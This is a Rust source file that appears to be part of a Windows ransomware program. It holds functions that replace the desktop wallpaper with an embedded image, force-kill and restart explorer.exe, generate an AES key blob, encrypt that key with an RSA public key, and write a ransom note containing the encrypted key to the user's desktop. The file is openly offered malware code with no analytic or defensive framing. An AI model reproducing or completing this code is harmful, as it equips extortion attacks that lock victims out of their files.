use passwords::PasswordGenerator;
use rand::rngs::OsRng;
use rsa::pkcs8::DecodePublicKey;
use rsa::{Oaep, RsaPublicKey};
use sha2::Sha256;
use std::ffi::OsStr;
use std::fs::File;
use std::io::Write;
use std::os::windows::ffi::OsStrExt;
use std::path::PathBuf;
use std::process::Command;
use winapi::um::winuser::{
    SystemParametersInfoW, SPIF_SENDWININICHANGE, SPIF_UPDATEINIFILE, SPI_SETDESKWALLPAPER,
};

/// This function writes an image file to the specified directory and sets it as the wallpaper.
/// The update is forced to ensure immediate effect without modifying the Windows registry.
pub fn change_wallpaper(directory: &str) -> Result<(), String> {
    let image_data = include_bytes!("../../resources/wallpaper.png");

    // Save the image to the specified folder
    let mut wallpaper_path = PathBuf::from(directory);
    wallpaper_path.push("wallpaper.bmp");

    let mut file = File::create(&wallpaper_path).map_err(|_| {
        format!(
            "Failed to create the wallpaper file at {}",
            wallpaper_path.display()
        )
    })?;
    file.write_all(image_data)
        .map_err(|_| "Failed to write to the wallpaper file".to_string())?;

    let path_str = wallpaper_path
        .to_str()
        .ok_or("Failed to convert the path to string")?;
    let pwstr = str_to_pwstr(path_str);

    // Apply the wallpaper change using Windows API
    let success = unsafe {
        SystemParametersInfoW(
            SPI_SETDESKWALLPAPER,
            0,
            pwstr.as_ptr() as *mut _,
            SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE,
        ) != 0
    };

    if !success {
        return Err("Failed to change the wallpaper".to_string());
    }

    // Ensure the wallpaper refreshes properly
    force_wallpaper_refresh();

    Ok(())
}

/// Converts a Rust string into a wide string format (UTF-16) for Windows API compatibility.
fn str_to_pwstr(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

/// Forces a wallpaper refresh without modifying the registry by restarting the Windows Explorer process.
fn force_wallpaper_refresh() {
    Command::new("taskkill")
        .args(["/F", "/IM", "explorer.exe"])
        .output()
        .ok(); // Ignore errors

    std::thread::sleep(std::time::Duration::from_secs(1)); // Small delay before restarting Explorer

    Command::new("explorer").spawn().ok(); // Restart Explorer
}

pub fn encrypt_aes_key(aes_key: Vec<u8>, public_pem: &str) -> Vec<u8> {
    let public_key =
        RsaPublicKey::from_public_key_pem(public_pem).expect("Error al parsear la clave pública");
    let mut rng = OsRng;
    // Usamos el tipo Oaep para crear el padding OAEP con SHA256
    let padding = Oaep::new::<Sha256>();

    public_key
        .encrypt(&mut rng, padding, &aes_key)
        .expect("Error al encriptar")
}
// AES Key gen
pub fn generate_key() -> Vec<u8> {
    let mut blob: Vec<u8> = vec![8u8, 2, 0, 0, 15, 102, 0, 0, 24, 0, 0, 0];
    let generator: PasswordGenerator = PasswordGenerator {
        length: 120,
        numbers: true,
        lowercase_letters: true,
        uppercase_letters: true,
        symbols: true,
        spaces: true,
        exclude_similar_characters: false,
        strict: true,
    };

    let generated_key = generator.generate_one().unwrap();
    blob.extend(generated_key.as_bytes());
    blob
}

pub fn write_ransom_note(
    user: &str,
    encoded_key: String,
    ransom_note: &str,
) -> Result<(), std::io::Error> {
    let desktop_path = format!("C:\\Users\\{}\\Desktop", user);
    let note_path = format!("{}\\README.txt", desktop_path);
    let note_content = ransom_note.replace("%KEY%", &encoded_key);
    let mut file = File::create(note_path)?;

    writeln!(&mut file, "{}", note_content)?;
    Ok(())
}
